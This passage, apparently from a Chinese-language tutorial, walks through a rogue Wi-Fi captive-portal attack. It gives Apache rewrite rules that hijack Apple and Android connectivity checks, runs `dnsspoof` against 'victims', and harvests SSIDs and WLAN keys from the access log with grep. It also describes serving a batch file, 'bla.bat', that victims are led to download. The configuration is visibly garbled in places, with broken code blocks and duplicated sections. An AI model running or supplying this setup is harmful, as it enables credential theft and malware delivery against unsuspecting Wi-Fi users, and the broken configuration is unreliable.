
`mkdir apple`

复制 `apple.conf` 文件以为 i 设备创建重定向规则。

```
cp /etc/apache2/sites-enabled/000-default /etc/apache2/sites-enabled/apple.conf
<VirtualHost *:80>
ServerAdmin webmaster@localhost
ServerName captive.apple.com
DocumentRoot /var/www/html/apple

RewriteEngine on
RewriteCond %{HTTP_USER_AGENT} "CaptiveNetworkSupport(\.*)" [NC]
RewriteRule ^/(.*)$ http://10.0.0.1/$1,R=302

ErrorLog ${APACHE_LOG_DIR}/error.log
CustomLog ${APACHE_LOG_DIR}/access.log
</VirtualHost>
```

## Android 设备的强制门户门户配置

在 apache 中为 android 创建目录

`cd /var/www/html/android`

`mkdir android`

复制 `android.conf` 文件以为 Android 设备创建重定向规则。

```
<VirtualHost *:80>
ServerAdmin webmaster@localhost

ServerAlias www.google.com
ServerAlias google.com
ServerAlias clients3.google.com
ServerAlias play.googleapis.com
ServerAlias accounts.google.com
ServerAlias connectivitycheck.android.com
ServerAlias clients1.google.com

```

RewriteEngine on

RewriteRule /generate_204$ /generate_204 [R=204,L]

RewriteCond %{HTTP_HOST} ^connectivitycheck.android.com$ [OR]

RewriteCond %{HTTP_HOST} ^google.com$ [OR]

RewriteCond %{HTTP_HOST} ^accounts.google.com$ [OR]

RewriteCond %{HTTP_HOST} ^accounts.google.com.x

RewriteCond %{HTTP_HOST} ^android.com$ [NC]

RewriteRule (.*)$ http://10.0.0.1/ [R=302]

RewriteCond %{HTTP_HOST} ^google.com$ [NC]

RewriteRule (.*)$ http://10.0.0.1/ [R=302]

```

Document /var/www/html/android
<Directory>
    Options FollowSymLinks
    AllowOverride None
</Directory>

```

ErrorLog $(APACHE_LOG_DIR)/error.log

CustomLog $(APACHE_LOG_DIR)/access.combined

```

</VirtualHost>
```

- FollowLinks: 如果目录是符号链接（快捷方式），则跟随该链接
- AllowOverride: All 允许 `.htaccess` 覆盖默认服务器配置，none 则禁止
- Indexes: 如果没有索引页面，则目录可以显示为列表。

参数详解：

对于 android 设备，你需要在 `android` 目录中创建一个空文件 `generate_204`

```
cd /var/www/html/android
touch generate_204
```

### Android 强制门户配置

```
cd /var/www/html/android
touch generate_204
```

### Windows 强制门户配置

```
cd /var/www/html/android
touch generate_204
```

## 10.0.0.1/R=302

### 打开 apache 的默认配置文件

```bash
nano /etc/apache2/sites-enabled/000-default
```

在文件中 `<directory>` 和 `</directory>` 之间输入下划线的文本。

请注意，我们正在添加一个名为 `/Fixit` 的目录作为异常。它是区分大小写的。我们将在第 2 部分直接添加它。

```apache
<Directory /var/www/>
Options Indexes FollowSymLinks MultiViews
AllowOverride None
Order allow,deny
allow from all
RewriteEngine On
RewriteCond %{REQUEST_URI} !\^/Fixit
RewriteRule ^.* $/Fixit/
</Directory>
```

### 启用 mod_rewrite

```bash
a2enmod rewrite
```

你必须重启 apache2 以更新配置。

```bash
service apache2 restart
```

### 第 4 步：欺骗 DNS

运行 `dnsspoof` 将将所有的 HTTP（非 HTTPS）请求重定向到我们的 apache 服务器，而受害者无法访问互联网（如果禁用了 IP 转发）。

> 如果你需要在访问互联网的同时攻击目标域名，这可能不是你想要的。在这种情况下，请使用 `dnsmasq` 配合 `fakehosts.conf`。

但目前，我们并不为受害者提供互联网访问，而是把他们全部钓住。因此，运行：

```bash
dnsspoof -i wlan0 #wlan0 是 hostapd 运行的接口
```

### 第 5 步：收集密钥

以追加模式运行 apache `access.log` 并通过管道传递给 `grep`。该正则表达式将解析我们传入的秘密配方，提取长达 20 个字符的 SSID/名称、AP 身份验证类型以及 8-64 个字符的 WLAN 密钥。

```bash
tail -F /var/log/apache2/access.log | grep -Eo "<name>?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?./name>|\<keyMaterial>?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?./|<authentication>?<keyMaterial>|<authentication>" | uniq
```

### 命令拆解：

- `tail -F <logfile>`: 带有 `-f` 参数的 `tail` 命令，用于读取 `access.log` 的最后 10 行，等待并在数据追加时显示数据。

输出随后实时传递给 `grep`：

| grep | 说明 |
| :--- | :--- |
| -E | 将 PATTERN 解释为扩展正则表达式 |
| -o | 仅打印匹配行中匹配到的（非空）部分，每个部分单独输出在的一行上 |
| uniq | 去除重复条目 |

休息一下

### 第 6 步：准备工作

在 `/var/www/` 中创建一个名为 "Fixit" 的目录，区分大小写！

```bash
mkdir /var/www/Fixit
```

### 第 7 步：秘密武器

我的 `index.html` 下载链接指向我的自定义文件 "bla.bat"。Bla.bat 并不复杂，它不会被任何防火墙拦截或受影响。只要网页浏览器正常工作，这个方法就会有效。
